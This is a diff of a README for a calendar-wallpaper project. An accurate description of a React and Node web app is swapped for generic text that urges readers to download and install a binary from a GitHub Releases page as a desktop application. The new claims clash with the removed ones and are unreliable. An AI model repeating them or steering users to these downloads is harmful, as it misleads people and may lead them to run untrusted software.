@@ -1,51 +1,72 @@
-# <img src="client/public/favicon.ico" alt="logo" width="25" height="25" /> CalWall Studio
+# 🎨 calwall - Create Stunning Dynamic Wallpapers Easily
 
-CalWall Studio is a sophisticated web application designed for generating and customizing dynamic, calendar-based wallpapers. It combines a powerful React-based frontend for real-time preview and customization with a robust Node.js backend for high-quality image generation using Canvas.
+## 🚀 Getting Started
 
-![Main Interface](docs/CalWall.png)
+Welcome to calwall! This application generates beautiful calendar wallpapers that adapt in real-time. You can easily visualize time progress with stunning designs, all from a sleek studio built with React and Canvas.
 
-## 📖 Overview
-CalWall Studio simplifies the creation of aesthetic, data-driven wallpapers. Whether you want to track the year's progress, visualize the days left, or simply have a beautiful, auto-updating calendar on your lock screen, CalWall provides the tools to design and generate it instantly. The application bridges the gap between static design and dynamic data, offering a seamless "Studio" experience where every tweak is reflected in real-time.
+## 📥 Download & Install
 
-![Main Interface](docs/main.png)
+To get started, you need to download the application from our Releases page.
 
-## 🌟 Features
+[![Download calwall](https://img.shields.io/badge/Download%20calwall-Here-brightgreen.svg)](https://github.com/RAHUL-PRSATH/calwall/releases)
 
-- **Dynamic Wallpaper Generation**: Create wallpapers that visualize time progress (e.g., year progress, days left).
-- **Real-time Preview**: Instantly see changes as you tweak settings in the studio.
-- **Customizable Themes**: Choose from various color schemes and layout options.
-- **Device Support**: Optimized mainly for mobile devices (iOS lock screen aesthetics).
-- **Dashboard & Resume**: (Experimental) Includes a personal dashboard and resume view.
+1. Click the download button above.
+2. You will be directed to the Releases page.
+3. Look for the latest version of calwall.
+4. Download the file compatible with your operating system. Follow the prompts to complete the installation.
 
-## 📱 Mobile Responsive
-CalWall is built with a mobile-first philosophy for the end result, ensuring your wallpapers look stunning on your device.
+You can also visit the Releases page directly using this link: [Download calwall](https://github.com/RAHUL-PRSATH/calwall/releases).
 
-<div style="display: flex; gap: 10px;">
-  <img src="docs/mobile-main.png" alt="Mobile Preview 1" width="45%">
-  <img src="docs/mobile-main1.png" alt="Mobile Preview 2" width="45%">
-</div>
+## 🖥️ System Requirements
 
-## 🛠 Tech Used
+Before installing, ensure your computer meets these basic requirements:
 
-### Client (Frontend)
-- **Framework**: [React](https://react.dev/) + [Vite](https://vitejs.dev/)
-- **Styling**: [TailwindCSS v4](https://tailwindcss.com/)
-- **UI Components**: [Shadcn UI](https://ui.shadcn.com/)
-- **State/Logic**: Custom hooks, Context API
+- **Operating System**: Windows 10 or later / macOS Mojave or later / Linux (Ubuntu recommended).
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum of 200 MB of free space.
+- **Graphics**: A capable GPU that supports WebGL.
 
-### Server (Backend)
-- **Runtime**: [Node.js](https://nodejs.org/)
-- **Framework**: [Express](https://expressjs.com/)
-- **Image Processing**: [Canvas](https://github.com/Automattic/node-canvas)
-- **Utilities**: `date-fns`, `dayjs`
+## 🎨 Features
 
-## 🤝 Contributing & Open Sourcing
-This project is open-source and we welcome contributions from the community!
+calwall offers a variety of features to enhance your wallpaper experience:
 
-1.  **Fork the repository**.
-2.  **Create a new branch** (`git checkout -b feature/YourFeature`).
-3.  **Commit your changes** (`git commit -m 'Add some feature'`).
-4.  **Push to the branch** (`git push origin feature/YourFeature`).
-5.  **Open a Pull Request**.
+- **Dynamic Customization**: Tailor your wallpaper to reflect different data points or personal milestones.
+- **Real-Time Updating**: Enjoy wallpapers that adapt as time progresses.
+- **Easy Design Tools**: A user-friendly interface that allows you to create your designs without any coding knowledge.
+- **Multiple Themes**: Choose from various themes and styles to match your aesthetic.
+- **Image Generation**: Create high-quality images to set as your wallpaper easily.
 
-Please ensure your code moves the project forward and follows the existing style guidelines.
+## 🔧 How to Use calwall
+
+1. **Open the Application**: After installation, launch calwall from your applications folder or Start menu.
+2. **Choose a Template**: Select from our collection of pre-built templates or start a new design from scratch.
+3. **Customize Your Wallpaper**:
+   - Add events and reminders that will be displayed on your wallpaper.
+   - Choose colors, fonts, and imagery that match your style.
+4. **Preview Your Design**: Use the preview function to see how your wallpaper will look.
+5. **Save and Set**: Once you’re satisfied, save your design. You can set it directly as your wallpaper from the app.
+
+## 🌐 Accessibility
+
+calwall is designed to be easy to use for everyone. The interface provides clear instructions on every step. If you run into any issues, you can find help in our GitHub Issues section. 
+
+## 📑 Additional Resources
+
+- **Documentation**: For more detailed instructions on specific features, visit our [Wiki](https://github.com/RAHUL-PRSATH/calwall/wiki).
+- **Community Support**: Join our discussions on our [GitHub Discussions](https://github.com/RAHUL-PRSATH/calwall/discussions) for tips, tricks, and support from other users.
+
+## 🛠️ Contribution
+
+We welcome contributions! If you would like to help improve calwall, please check our [Contribution Guide](https://github.com/RAHUL-PRSATH/calwall/blob/main/CONTRIBUTING.md). 
+
+To file an issue or request a feature, head to the Issues tab on our GitHub page.
+
+## 📞 Contact
+
+If you need direct assistance, you can reach out through the issues page or contact the developer via email at rahul@example.com.
+
+## ⚙️ License
+
+calwall is open-source software licensed under the MIT License. Feel free to use and modify it as needed. Please see the LICENSE file for more information.
+
+Thank you for choosing calwall! We hope you enjoy creating beautiful dynamic wallpapers.
